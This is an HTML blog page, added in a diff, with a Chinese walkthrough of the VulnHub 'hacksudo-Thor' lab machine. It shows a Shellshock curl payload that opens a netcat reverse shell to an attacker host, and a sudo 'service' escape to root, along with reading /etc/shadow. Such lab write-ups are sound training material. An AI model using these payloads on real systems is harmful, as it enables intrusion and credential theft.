@@ -1,0 +1,284 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>0x10-VulnHub-hacksudo-Thor | xiaomao</title>
+<link rel="shortcut icon" href="https://xiaomaoq.github.io//favicon.ico?v=1742647247277">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://xiaomaoq.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="0x10-VulnHub-hacksudo-Thor | xiaomao - Atom Feed" href="https://xiaomaoq.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="环境
+靶机：https://download.vulnhub.com/hacksudo/hacksudo---Thor.zip
+难度：中
+内容
+
+开源源码泄露
+CGI
+破壳漏洞   .cgi  .sh
+SUID提权
+
+操作
+信息收集
+常规的..." />
+    <meta name="keywords" content="vulnhub,打靶" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://xiaomaoq.github.io/">
+  <img class="avatar" src="https://xiaomaoq.github.io//images/avatar.png?v=1742647247277" alt="">
+  </a>
+  <h1 class="site-title">
+    xiaomao
+  </h1>
+  <p class="site-description">
+    取法乎上，仅得其中<br>
+取法乎中，仅得其下
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://xiaomaoq.github.io/guan-yu" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              0x10-VulnHub-hacksudo-Thor
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-03-12
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://xiaomaoq.github.io/SARbZmWC9/" class="post-tag">
+                  # vulnhub
+                </a>
+              
+                <a href="https://xiaomaoq.github.io/sYnh9qvSqV/" class="post-tag">
+                  # 打靶
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="环境">环境</h1>
+<p>靶机：https://download.vulnhub.com/hacksudo/hacksudo---Thor.zip</p>
+<p>难度：中</p>
+<h2 id="内容">内容</h2>
+<ol>
+<li>开源源码泄露</li>
+<li>CGI</li>
+<li>破壳漏洞   .cgi  .sh</li>
+<li>SUID提权</li>
+</ol>
+<h1 id="操作">操作</h1>
+<h2 id="信息收集">信息收集</h2>
+<p>常规的端口扫描 主机发现      80端口是个登录界面  试了试弱口令 进不去</p>
+<p>再扫一扫目录   发现还有个登录界面   然后在readme.md找到了默认密码 (也可以根据这个文件提供的github地址 去github找源码 看看有什么泄露的东西  这里在文档上面就直接出来了默认账密)</p>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121718200.png" alt="image-20240312171811159" loading="lazy"></figure>
+<p>添加功能出现了sql语句的报错       但是无法拿到shell</p>
+<figure data-type="image" tabindex="2"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121726312.png" alt="image-20240312172620282" loading="lazy"></figure>
+<p>这里有四个账号  点击去也可以看到密码</p>
+<figure data-type="image" tabindex="3"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121917896.png" alt="image-20240312191703860" loading="lazy"></figure>
+<p>还有一种思路   已经获取了这系统的源码  我们可以去翻翻源码里面的sql文件 去看看 有没有初始的用户</p>
+<p>再用提到的账号密码去登录80的那个登陆页面</p>
+<figure data-type="image" tabindex="4"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121923615.png" alt="image-20240312192307583" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121923113.png" alt="image-20240312192339091" loading="lazy"></figure>
+<p>这个post news 功能存在 xss  但是没啥用</p>
+<figure data-type="image" tabindex="6"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121749205.png" alt="image-20240312174939172" loading="lazy"></figure>
+<h2 id="业务逻辑漏洞">业务逻辑漏洞</h2>
+<p>用找到的几个默认的用户可以登录进去80的那个后台   zakee94	nafees123        可以看到这个用户有多少钱</p>
+<figure data-type="image" tabindex="7"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121932828.png" alt="image-20240312193258773" loading="lazy"></figure>
+<p>添加一个用户  然后给这个用户转钱</p>
+<figure data-type="image" tabindex="8"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121939162.png" alt="image-20240312193922132" loading="lazy"></figure>
+<p>直接用他的登录密码</p>
+<figure data-type="image" tabindex="9"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121941879.png" alt="image-20240312194100850" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121941022.png" alt="image-20240312194130998" loading="lazy"></figure>
+<p>在admin后台也可看到用户PIN  也可以让用户扣钱</p>
+<figure data-type="image" tabindex="11"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121942752.png" alt="image-20240312194211726" loading="lazy"></figure>
+<p>不能够让登录的密码成为支付密码 (但是我发现健身银行就是这样啊哈 )</p>
+<h2 id="cgi">CGI</h2>
+<p>在扫目录的时候 发现了 cgi-bin   一开始是403  但是当我们登录后再去访问 就能够看到页面内容了(没啥可利用的)</p>
+<p><strong>CGI</strong>：通用网关接口（Common Gateway Interface）是一个Web服务器主机提供信息服务的标准接口。通过CGI接口，Web服务器就能够获取客户端提交的信息，转交给服务器端的CGI程序进行处理，最后返回结果给客户端<br>
+<img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122249428.png" alt="image-20240312224912400" loading="lazy"></p>
+<p>进行请求处理的可能是shell脚本</p>
+<p>在cgi-bin这个目录下就会存储很多脚本文件   .cgi    .sh</p>
+<p>于是就用dirsearch 去扫描一下cgi-bin 目录存在哪些文件</p>
+<p><code>python3 dirsearch.py -u http://192.168.3.122/cgi-bin -f -e sh,cgi</code></p>
+<figure data-type="image" tabindex="12"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122053189.png" alt="image-20240312205325160" loading="lazy"></figure>
+<p>响应码是500   服务器报错的响应码   说明存在这个文件，只是我们没有提供正确的参数 ，服务器无法处理我们请求</p>
+<p>而这个可能收到破壳漏洞的影响</p>
+<p>在涉及 CGI 的环境中，如果 Web 服务器使用的是 Bash 作为 CGI 脚本的解释器，并且系统受到了破壳漏洞的影响，那么攻击者可能会利用 CGI 程序来触发<strong>破壳漏洞</strong>，进而实现对系统的攻击。通过在 CGI 请求中注入恶意内容，攻击者可以利用破壳漏洞执行任意代码，从而危害系统安全</p>
+<h2 id="破壳漏洞">破壳漏洞</h2>
+<p>破壳漏洞(shell)，利用整个web应用的软件架构中的一部分可以执行代码的软件组件，通过这种漏洞来实现代码执行，反弹shell等操作</p>
+<p>破壳漏洞所利用的就是shell的bash类型</p>
+<p>根本原因：由于bash解析环境变量当中引用的函数定义的时候，它的过滤和函数定义的界限区分不清晰，而造成了这个漏洞**</p>
+<p>如果web应用使用了cgi技术，通过外部程序的引用，引用了操作系统的bash来处理一些指令的话，那么就可以把http服务作为访问操作系统shell的通道，向操作系统shell，提交环境变量定义，环境变量定义当中，又引入其他的函数定义，实现目标的手段</p>
+<p>判断和利用：</p>
+<p>去寻找<strong>web程序下/cgi-bin下是否存在cgi，sh的文件，<strong>如果存在，那么就意味着这个</strong>web应用程序所引用</strong>的<strong>外部应用程序</strong>就是<strong>操作系统的shell</strong></p>
+<p>条件：操作系统使用的是<strong>bash并且版本老</strong></p>
+<p>如果存在cgi或者sh后缀的话，使用nmap进行<strong>判断</strong>是否有破壳漏洞</p>
+<p>检测</p>
+<p><code>nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 192.168.3.122</code></p>
+<figure data-type="image" tabindex="13"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122109411.png" alt="image-20240312210906369" loading="lazy"></figure>
+<p>使用curl进行进一步探测，自定义一个ua头，然后再u头中自定义一个函数，然后输入操作系统的指令，并查询是否存在nc</p>
+<p><code>curl -H &quot;user-agent: () { : ; }; echo; echo; /bin/bash -c ' which nc '&quot; \http://192.168.3.122/cgi-bin/shell.sh</code></p>
+<figure data-type="image" tabindex="14"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122109505.png" alt="image-20240312210938476" loading="lazy"></figure>
+<p>反弹shell</p>
+<p><code>curl -H &quot;user-agent: () { : ; }; echo; echo; /bin/bash -c ' nc -e /bin/bash 192.168.3.120 3333 '&quot; \http://192.168.3.122/cgi-bin/shell.sh</code></p>
+<figure data-type="image" tabindex="15"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122111314.png" alt="image-20240312211108284" loading="lazy"></figure>
+<h2 id="提权">提权</h2>
+<p>这条 sudo 配置的含义是允许用户 www-data 在主机 HackSudoThor 上以 <strong>thor 用户的身份</strong>执行 <code>/home/thor/./hammer.sh</code> 这个命令，并且在执行时不需要输入密码  并不是以root</p>
+<figure data-type="image" tabindex="16"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122201939.png" alt="image-20240312220136911" loading="lazy"></figure>
+<p>但是你直接去这样执行</p>
+<figure data-type="image" tabindex="17"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122202882.png" alt="image-20240312220243861" loading="lazy"></figure>
+<p>需要这样   指定thor用户</p>
+<p><code>sudo -u thor /home/thor/./hammer.sh</code></p>
+<p>再通过这个应用的一些操作  拿到了 thor的shell</p>
+<figure data-type="image" tabindex="18"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122211117.png" alt="image-20240312221126087" loading="lazy"></figure>
+<p>爆破出来目录里面的id_rsa    再结合user里面的  试试可不可以登录   但是这个思路不对诶</p>
+<figure data-type="image" tabindex="19"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122218695.png" alt="image-20240312221841644" loading="lazy"></figure>
+<p>还没看看有没有suid   sudo -l (切换个用户就要重新看看 这个用户有没有配置错误</p>
+<figure data-type="image" tabindex="20"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122226667.png" alt="image-20240312222648631" loading="lazy"></figure>
+<p>去找 https://gtfobins.github.io/gtfobins/service/</p>
+<p><code>sudo service ../../bin/sh</code></p>
+<figure data-type="image" tabindex="21"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122233948.png" alt="image-20240312223352910" loading="lazy"></figure>
+<p>也可以用  sudo cat /etc/shadow 的root密码 然后破解密码</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E7%8E%AF%E5%A2%83">环境</a>
+<ul>
+<li><a href="#%E5%86%85%E5%AE%B9">内容</a></li>
+</ul>
+</li>
+<li><a href="#%E6%93%8D%E4%BD%9C">操作</a>
+<ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
+<li><a href="#%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E">业务逻辑漏洞</a></li>
+<li><a href="#cgi">CGI</a></li>
+<li><a href="#%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E">破壳漏洞</a></li>
+<li><a href="#%E6%8F%90%E6%9D%83">提权</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://xiaomaoq.github.io/linux-ti-quan-xiao-jie/">
+              <h3 class="post-title">
+                Linux提权小结
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://xiaomaoq.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
